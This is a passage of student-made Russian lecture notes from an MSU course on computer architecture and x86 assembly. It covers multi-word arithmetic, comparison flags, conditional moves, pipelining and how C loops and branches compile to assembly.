      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




В этом случае большой операнд, который не помещается в регистре, можно разбить на две
логические части. Тогда далее можно будет выполнять определенное цепочечное действие
над его кусками, начиная с младших разрядов.
long long f1( long long a, long long b) {
    long long c;
    c = a + b;
    return c;
}
Код ассемблера (начало и конец функции опущены):
     mov           eax ,          dword    [ ebp +16] ; (1)
     mov           edx ,          dword    [ ebp +20] ; (2)
     add           eax ,          dword    [ ebp +8] ; (3)
     adc           edx ,          dword    [ ebp +12] ; (4)
  В данном примере имеем следующее заполнение стека (рис. 6.10). Перегружаем b на
EAX и EDX, далее:
                                 𝑎 = 𝑎 ℎ : 𝑎𝑙

                                                              𝑏 = 𝑏 ℎ : 𝑏𝑙

После этого складываем младшие разряды. Если происходит переполнение, CF
обновляется (0 или 1). Далее применяем команду ADC, которая скалывает старшие
разряды. Если было переполнение, то переносится один разряд. Вычитание производится
аналогично.

                                                        +20                        b
                                                        +16
                                                            +12
                                                            +8                     a
                                                esp               адрес возврата
                                                      ebp




                                          Рис. 6.10: Иллюстрация к объяснению



Умножение 64 разрядных чисел на 32 разрядных регистрах
   Рассмотрим случай умножения 640разрядных чисел. В машине есть несколько видов
умножения (знаковое и беззнаковое). При этом в машине нет специализированной
поддержки умножения и сложения чисел двойной разрядности. Построим вручную
код, который будет опираться на имеющиеся команды умножения, чтобы получить
корректный результат.



                                                                   80
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




long long f2( long long a,
        long long b) {
    long long c;
    c = a * b;
    return c;
}
   Отметим, что при сохранении результата в разрядной сетке мы будем иметь один и тот
же код для знаковых и беззнаковых величин. Пусть есть некоторый битовый вектор. Его
знаковая интерпретация:
                                    𝐶 ( 𝑥®𝑤 ) = 𝑥 зн

                                                                 0
                                                   𝑈 ( 𝑥®𝑤 ) = 𝑥 беззн

   Тогда при умножении беззнаковых величин:

                                  (𝑥 0 · 𝑦0)𝑚𝑜𝑑 2𝑤 = (𝑥 · 𝑦)𝑚𝑜𝑑 2𝑤 = (𝑥 · 𝑦0)𝑚𝑜𝑑 2𝑤

Доказать это утверждение можно, если учесть, что справедливо

                                                  𝑥 0 = 𝑥 + 2𝑤 𝑥 𝑤−1

   Ассемблерный код:
   �
globl f2
f2:
     push ebp
     mov ebp , esp
     push ebx
     mov eax , dword                    [ ebp +8]
     mov edx , dword                    [ ebp +16]
     mov ecx , dword                    [ ebp +20]
     mov ebx , dword                    [ ebp +12]
     imul ecx , eax
     imul ebx , edx
     mul edx
     add ecx , ebx
     add edx , ecx
     pop ebx
     pop ebp
     ret


                                                           81
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Таким образом, имеем два вектора, которые мы разбиваем на старшие и младшие части
и производим умножение:

    𝑌®𝑤ℎ : 𝑌®𝑤𝑙 ∗2𝑤 𝑋®𝑤ℎ : 𝑋®𝑤𝑙 = {22𝑤 𝐶 (𝑌®𝑤ℎ )𝐶 ( 𝑋®𝑤ℎ ) + 2𝑤 · [𝐶 (𝑌®𝑤ℎ )𝑈 (𝑋 >,𝑤𝑙 ) + 𝐶 ( 𝑋®𝑤ℎ )𝑈 (𝑌®𝑤𝑙 )]+

                                                    +𝑈 (𝑌®𝑤𝑙 )𝑈 ( 𝑋®𝑤𝑙 )} 𝑚𝑜𝑑 22𝑤

                                       4w      3w      2w     w     0


                                                                        h*h

                                                                        h*l

                                                                        l*h

                                                                        l*l


                                  Рис. 6.11: Иллюстрация к объяснению

   Распишем данное выражение для разрядной сетки (рис. 6.11). Результат умножения
long long – 64-разрядный. Младшие части должны целиком попасть в сумму, при этом, так
как эти части будут интерпретироваться как коэффициенты при положительных степенях
двойки, эти части должны быть перемножены с помощью команды mul, работающей с
беззнаковыми числами.




                                                         82
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 7. Как организована передача управления.
Сравнение беззнаковых чисел
   Рассмотрим следующие коды условий (рис. 7.1) и определим, как сложное
условие, которые применяются для сравнения чисел, соотносятся с флагами, которые
вырабатываются при выполнении арифметических действий.




                                      Рис. 7.1: Коды условий

   Самый простой пример – сравнение чисел по признаку равны или нет:

                                      𝑋 𝑣𝑠. 𝑌 =⇒ 𝑋 − 𝑌 𝑣𝑠. 0

Команда cmp вычитает свои операнды друг из друга и логически сравнивает результат с
нулем. Получается комплект арифметических флагов, взведенных или сброшенных после
выполнения данной операции. Тогда, если результат вычитания – ноль, то взведен флаг
ZF и величины равны. Если флаг не взведен, величины не равны.
   Рассмотрим числовую матрицу (рис. 7.2). Отсюда получаем, что коды условия
сравнения для беззнаковых чисел соответствуют выражению:

                                      𝑗 𝐵 : (𝑥 − 𝑦) <𝑢 0 : 𝐶𝐹

                                  𝑗 𝐴 : (𝑥 − 𝑦) >𝑢 0 : ∼ 𝐶𝐹 8 ∼ 𝑍 𝐹


Сравнение знаковых чисел
   Рассмотрим числовую матрицу небольшого размера для случая знаковых чисел
(рис. 7.3). Флаги в этом случае учитывают также знаковое переполнение.



                                                 83
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU


                                          y



                                              CF=1

                                                            (x-y)
                                                     CF=0



                                                                    x

                                  Рис. 7.2: Иллюстрация к объяснению




                                   Рис. 7.3: Сравнение знаковых чисел


    При вычитании (𝑥 − 𝑦) на главной диагонали будет взведен ZF. Синей штриховкой
на рис. 7.3 указана область знакового переполнения. Эта область соответствует случаю,
когда при вычитании из отрицательного x вычли такой положительный y, что результат
– отрицательная величина, которая не вмещается в размер типа. Дополнительно на эту
матрицу можно наложить флаг SF (красная штриховка).Двойная штриховка соответствует
случаю, когда из положительного числа вычитают отрицательное. При этом должно было
получиться положительное число, но из-за переполнения оно стало отрицательным.
    Машина комбинирует информацию о выставленных флажках в осмысленное условие
на сравнение двух знаковых чисел. Например, для следующего кода условия:

                                       𝑗𝑙 : (𝑥 − 𝑦) < 𝑐 0 : 𝑆𝐹ˆ𝑂𝐹


                                  𝑗𝑔 : (𝑥 − 𝑦) > 𝑐 0 : ∼ (𝑆𝐹ˆ𝑂𝐹)& ∼ 𝑍 𝐹


Сравнение: со знаком и без
   Рассмотрим следующую ситуацию. Нам даны некоторые величины, которые должны
восприниматься как знаковые, но коды условий были перепутаны. В этом случае результат
скорее всего будет неправильным, так как если части матрицы изменить (рис. 7.4) мы


                                                     84
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




получим, срабатывание описанных выше выражений над флагами в областях, указанных
на рис. 7.4. Беззнаковые числа будут соотноситься иначе с кодами для знаковых чисел
(будут захватываться другие области).




                                    Рис. 7.4: Сравнение: со знаком и без

   Рассмотрим пример работы с булевыми типами. В случае с типом int все ясно – под
него выделяется нужное количество байт. Тип данных _𝐵𝑜𝑜𝑙 мы соотносим с байтом,
который может принимать только два значения: {0, 1}. В машине есть специальная
команда, которая позволяет работать с таким величинами: SET. У нее один операнд –
регистр или память из 8 разрядов. В зависимости от условия она отправляет в операнд 1
или 0:
                                     𝑆𝐸𝑇 𝑜𝑐 𝑅/𝑚8

   if(cc){ОП ←− 1}
    else {ОП ←− 0 }

   Задача. Рассмотрим следующую задачу, связанную с описанной командой. Пусть есть
некоторая функция, описанная ассемблерным текстом:
CMP :
        MOV EAX , [ esp +8]             (1)
        CMP [ ESP +4] , EAX             (2)
        setl AL                         (3)
        ret                             (4)
   Требуется правильным образом заполнить пробелы в заголовке функции и в том, что
она будет возвращать:


                                                    85
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




_Bool cmp (                       x,   y){
    return                        x    y;
}
   Рассмотрим заполнение стека в этом случае (рис. 7.5). Типовой пролог в данном случае
отсутствует, соответственно esp показывает прямо на адрес возврата. Таким образом, над
ними располагаются параметры по смещению +4 и +8. Когда происходит выполнение
первой команды с пересылкой в EAX, получаем 𝐸 𝐴𝑋 | 𝑦 . Следующая строка – сравнение,
причем сначала идет x, а потом – y. Согласно коду условия, мы имеем знаковое сравнение.
Соответственно, мы работаем со знаковым 32-разрядным числом, то есть в коде можно
написать int.

                                                              x
                                                   +8         y
                                             esp   +4   адрес возврата




                                         Рис. 7.5: Иллюстрация к объяснению

   Из (2) и (3) строк следует, что между х и у нужно поставить знак <. Таким образом,
имеем код:
_Bool cmp (int x, int y){
    return x<y;
}


Реализация операндов с помощью известных команд
   Посмотрим, как конкретные операторы языка Си будут реализоваться с помощью
изученных ранее команд (безусловный переход и переход с условием). В программах
управляющие операторы могут образовывать различные конструкции; компилятор
просматривает код и строит внутреннее представление, действуя по некоторым шаблонам.
Рассмотрим выражение для оператора if-else:
if( expr ){
     tnen_stmt ;
} else {
     else_stmt
}
Это можно представить в виде:
_Bool t = !( expr )



                                                        86
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Учтем, в машине есть возможность сравнения (cmp), перепрыгнуть по условию на какую-
то ветку (jcc label). Этак конструкция соотносится с оператором:
if(cc) goto label ;
   В случае обычного прыжка (jmp label) имеем соотношение с
goto         label ;
Далее приводит код в так называемую goto-форму:
_Bool t = !( expr )
      if (|) goto Else ;
      then_start ;
      goto End ;
else :
      else_start ;
end :
   Если изначально условие не выполняется, тогда, согласно коду, мы сразу переходим
на вторую ветку (произошло формальное обращение условия). Далее, в случае
естественного хода переходим к End. С помощью сравнений и условных переходов
вида:
cmp ....
jcc       . else
[ then ....]
jmp . end
,else ;
     [ else ]
,end :
можно реализовать if-else.

   Пример:
int absdiff (int x, int y) {
    int result ;
    if (x > y) {
        result = x-y;
    } else {
        result = y-x;
    }
    return result ;
}



                                        87
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Ассемблерный код:
absdiff :
     push ebp
     mov ebp ,                    esp
     mov edx ,                    dword [8 + ebp ] ;    (1)
     mov eax ,                    dword [12 + ebp ] ;   (2)
     cmp edx ,                    eax               ;   (3)
     jle . L6                                       ;   (4)
     sub edx ,                    eax               ;   (5)
     mov eax ,                    edx               ;   (6)
     jmp .L7                                        ;   (7)
.L6:                                                ;   (8)
     sub eax ,                    edx               ;   (9)
.L7:                                                ;   (10)
     pop ebp
     ret
   Приводим программу в goto-вид:
int goto_ad (int x, int y) {
     int result ;
     if (x <= y) goto Else ;
     result = x-y;
     goto Exit ;
Else :
     result = y-x;
Exit :
     return result ;
}
   Соотносим с ассемблерным кодом:
absdiff :
    push ebp
    mov ebp ,                     esp
    mov edx ,                     dword [8 + ebp ]      ;   (1)
    mov eax ,                     dword [12 + ebp ]     ;   (2)
    cmp edx ,                     eax                   ;   (3)
    jle . L6                                            ;   (4)
    sub edx ,                     eax                   ;   (5)
    mov eax ,                     edx                   ;   (6)
    jmp .L7                                             ;   (7)


                                                      88
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




.L6:                                            ; (8)
       sub eax , edx                            ; (9)
.L7:                                            ; (10)
       pop ebp
       ret


Условная передача данных
   Помимо обычного if-else и ситуаций, когда нужно развести управление, есть также
тернарный оператор, работа которого сводится к условному присвоению. В зависимости
от условия идет присвоение либо одного, либо другого выражения и значения этих
выражений присваиваются тому, что находится в левой части (см. код ниже).
val = Test ? Then_Expr : Else_Expr ;

val = x>y ? x-y : y-x;
   Такую конструкцию можно обработать следующим способом. Можно привести
тернарный оператор к известным командам (сводим задачу к предыдущей):
     nt = !( Test );
     if (nt ) goto Else ;
     val = Then_Expr ;
     goto Done ;
Else :
     val = Else_Expr ;
Done :
...
С другой стороны, возможна другая реализация:
tmp_val = Then_Expr ;
val = Else_Expr ;
t = Test ;
if (t) val = tmp_val ;
Здесь сначала вычисляется первое выражение. Его значение присваивается временной
переменной. Потом вычисляется значение второго выражения. В зависимости от
того, сработало ли условие, производится условное присвоение. В машине есть
соответствующая команда, которая позволяет это осуществить – CMOV:

                                                16       16
                                   𝐶 𝑀𝑂𝑉 𝑐𝑐 𝑅      , 𝑟/𝑚
                                                32       32
Она выполняет следующие действия:


                                           89
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




if(cc ){
ОП1 ←− ОП2
}
Вторая рассмотренная стратегия дает выигрыш по времени выполнения работы.


Конвейер – совмещение разных действий в один момент времени
   Пусть есть электрическая цепь, которая реализует выполнение команды. Можно
разделить их на части, делая так, чтобы в один и тот же момент времени идет наложение
последовательности выполняемых команд. Действие может зарезаться на три этапа, как
описано ниже. Конвейер – совмещение разных действий в один момент времени.

    • Общая для различный предметных областей методика

    • Длительность обработки неизменна или несколько увеличивается

    • Увеличение пропускной способности

   На рис. 7.6 описан процесс наложения последовательности команд. В данном случае
действие нарезается на три этапа. Как только первый этап кончился – начинается
следующий этап следующего действия. Применительно к команде такое разделение
приводит к понятию конвейера команды. Это позволяет независимо разрабатывать
и развивать логику каждого отделочного этапа. Тогда на выходе конвейера каждая
команда будит завершаться и выполнять свою функцию не за весь период ее выполнения,
а за длительность работы отдельного этапа. Чем больше этапов и чем быстрее они
выполняются, тем больше общая пропускная способность по командам. Такой подход
сейчас используется во всех современных процессорах.




                                  Рис. 7.6: Иллюстрация к объяснению

   Таким образом, мы получаем увеличение пропускной способности, так как отдельный
такт соотносится с работой отдельного этапа. Однако, следует учитывать, что для
работы конвейера нужно обеспечивать его непрерывную загрузку. Каждый такт
нужно отправлять на него команду, которая будет выполняться все этапы. Например,
конвейер, состоящий из пяти этапов (извлечение инструкции из памяти, декодирование,



                                                 90
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




загрузка операндов, сама операция и запись результат) представлена на рис. 7.7.
Здесь первая команда достигает этапа записи (рис. 7.7). За ней далее следуют другие
команды. Рассмотрим выполнение последовательности команд с прыжком. Сначала
происходит извлечение сравнения. В следующий момент времени эта команда начинает
декодироваться, извлекается идущая за ней непосредственно в памяти. В следующий
момент времени поддтягиваются для сравнения значения регистров edx и eax. Далее
команда второй строки декодируется, а команда третьей строки – извлекается. Далее
(четвертый столбец на рис. 7.7) команда первой строки – сравнение, команда второй
строки декодируется с меткой, команда третьей строки декодируется, команда четвертой
строки – извлекается. Далее – этап записи. В этот момент времени мы переходим на
следующий прыжок (так как уже получен некоторый результат), обновляем регистр
флагов и перепрыгиваем на метку .L6. Здесь становится понятно, что запись результата
– это перезапись регистра EIP, соответственно, нужно выкинуть всё из конвейера. Здесь
пять этапов, соответственно, нужно выкинуть четыре команды, переставить счетчик
команд на шестую строку и с него начать заново. После этого мы будем ждать пять
тактов, пока конвейер полностью наполнится (пока первая загруженная команда дойдут
до этапа записи результата). Чем больше неожиданных для загрузки конвейера, тем хуже
выполняется работа.




                                  Рис. 7.7: Пример конвейера

   Рассмотрим следующий пример вычисления модуля разности:
int absdiff (int x, int y) {
    int result ;
    if (x > y) {
        result = x-y;
    } else {
        result = y-x;


                                             91
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




      }
      return result ;
}
    Более короткая запись (через тернарный оператор):
int absdiff (int x, int y) {
    return (x > y)? x-y: y-x;
}
Чтобы реализовать код с применением условной передачи данных, потребуется еще
пара регистров. На тот момент, который рассматривается в ассемблерном коде ниже,
параметры x и y загружены в регистры (рис. 7.8). х мы копируем в edx, после чего
вычисляется разность 𝑥 − 𝑦. Дальше, в eax мы вычисляем обратную разность. Далее
сравниваем edi и esi (то есть x) больше y, величина 𝑥 − 𝑦 отравляется в eax. Отметим, что
в данном случае все действия выполнили, ни разу не перезагрузив конвейер.
absdiff :
    ...
    mov edx , edi
    sub edx , esi ; tmp_val : edx = x-y                 Рис.         7.8:
                                                        Расположение
    mov eax , esi
                                                        параметров
    sub eax , edi ; result : eax = y-x
    cmp edi , esi ; Compare x:y
    cmovg eax , edx ; If >, result : eax = tmp_val : edx
    ...
   Однако в некоторых ситуациях у нас нет возможности сводить процесс к условной
передаче данных. Например,
int **p;
xp? **p :0;
   Попробуем реализовать указанное выше, отправив результат в eax и считая, что само
значение переменной p лежит в edx. Казалось бы, это можно реализовать командами:
MOV EAX ,0
TEST EDX , EDX
CMOVNE EAX , [ EDX ]
    Однако, вне зависимости от того, будет ли запись, команда начнет обращать по адресу,
указанному в третьей строке. Если этот адрес не ноль и указывает в правильное место,
где что-то лежит, то все работает. Но если EDX показывает на ноль, команда не успеет
до конца отработать – будет аварийное завершение. Такая ситуация называется сбой при
выполнении. Возможна и другая ситуация – наличие побочных эффектов (например,
присвоение каких-то значений в переменные и др.). Тогда, в результате использования


                                           92
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




описанной выше стратегии, мы можем получить срабатывание побочного эффекта,
которого не дорожно быть. Третий случай – ”тяжелые”вычисления. В этом случае не
достигается выигрыш по производительности.


Оператор do-while
   В языке Си имеется три основных вида циклов. Рассмотрим реализацию цикла
do-while. Тело цикла реализуется как есть, потом доходим до проверки и без обращения
условий вычисляем expression. Если он верный, прыгаем обратно на метку. Таким
образом, конструкция сводится к go-to-форме.Рассмотрим реализацию:
int pcount_do ( unsigned x) {
     int result = 0;
loop :
     result += x & 0x1;
     x >>= 1;
     if (x)
         goto loop ;
     return result ;
}
   Ассемблерный код:
    mov ecx , 0 ; result = 0
.L2: ; loop :
    mov eax , edx
    and eax , 1 ; t = x & 1
    add ecx , eax ; result += t
    shr edx , 1 ; x >>= 1
    jne .L2 ; If !0 , goto loop
   Здесь ecx – общая сумма обнаруженных единиц в параметре функции pcount_do, в
edx – текущее значение х. При реализации знаечние х будет разрушаться, поэтому мы
копируем его в eax. Далее мы прибавляем его к ecx, далее текущее значение x сдвигается
на 1. Сдвиг влияет на некоторые флаги, поэтому мы проверяем значение флага (если не
ноль, прыгаем назад).


Оператор while
   Другие циклы можно свести к форме, описанной выше. Например, для цикла while:
int pcount_while ( unsigned x) {
    int result = 0;



                                         93
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     while (x) {
         result += x & 0x1;
     x >>= 1;
     }
     return result ;
}
Отсоединяем однократную проверку и переносим ее в начало:
int pcount_do ( unsigned x) {
     int result = 0;
     if (!x) goto done ;
loop :
     result += x & 0x1;
     x >>= 1;
     if (x)
         goto loop ;
done :
     return result ;
}
Если условия проверки не выполнены, мы переходим на done. То, что осталось, можно
свести к do-while:
int pcount_do ( unsigned x) {
     int result = 0;
loop :
     if (!x) goto done ;
     result += x & 0x1;
     x >>= 1;
     goto loop ;
done :
     return result ;
}


Оператор for
    Аналогично для оператора for. Сначала мы приводим его к оператору while, а потом –
к do-while. Например:
# define WSIZE 8* sizeof (int)

int pcount_for ( unsigned x) {


                                         94
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




      int i;
      int result = 0;
      for (i = 0; i < WSIZE ; i ++) {
          unsigned mask = 1 << i;
          result += (x & mask ) != 0;
      }
      return result ;
}
    Разворачиваем первую проверку:
int pcount_for_gt ( unsigned x) {
    int i;
    int result = 0;
    i = 0;
    if (!( i < WSIZE ))
          goto done ;
   loop :
    {
          unsigned mask = 1 << i;
          result += (x & mask ) != 0;
    }
    i ++;
    if (i < WSIZE )
          goto loop ;
    done :
          return result ;
}
   В машине есть специальная команда для работы с циклами – LLOP. Однако, на
практике она не используется. Данная команда предполагает некоторое итерирование:

                                      𝐿𝑂𝑂𝑃 𝑟𝑒𝑙8

    Существуют вариации:
                                     𝐿𝑂𝑂𝑃𝐸 𝑟𝑒𝑙8

                                     𝐿𝑂𝑂𝑃𝑁 𝐸 𝑟𝑒𝑙8

Во всех трех случаях операндом выступает метка. Рассмотрим фрагмент кода:
int fib (int x) { // x >= 1
    int i;
    int p_pred = 0;


                                          95
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




        int pred = 1;
        int res = 1;
        x - -;
        for (i = 0; i < x; i ++) {
               res = p_pred + pred ;
               p_pred = pred ;
               pred = res ;
        }
        return res ;
}
Тогда:
fib :
        push ebp
        mov ebp , esp
        push ebx

        mov           ecx , dword [ ebp + 8] ; x
        xor           edx , edx ; p_pred
        mov           ebx , 1 ; pred
        mov           eax , 1 ; res
        dec           ecx

      jecxz . end
. loop :
      lea eax , [ edx + ebx ]
      mov edx , ebx
      mov ebx , eax
      loop . loop
. end :
      pop ebx
      pop ebp
      ret
В этом фрагменте кода есть loop, за ним идет метка, которая потом ассемблером будет
заменена на некоторое числовое смещение. Во всех трех случаях команда уменьшает ECX
на 1 и переходит по метке в случае, если ECX не ноль:

                                        𝐸𝐶 𝑋 ←− 𝐸𝐶 𝑋 − 1

                                       𝑗 𝑚 𝑝 𝑟𝑒𝑙8 𝑖 𝑓 𝐸𝐶 𝑋 ≠ 0


                                                 96
         ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
         МАТЕМАТИКИ И КИБЕРНЕТИКИ
         МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




В случае LOOPE:
                                          &𝑍 𝐹 == 1

В случае LOOPNE:
                                          &𝑍 𝐹 == 0

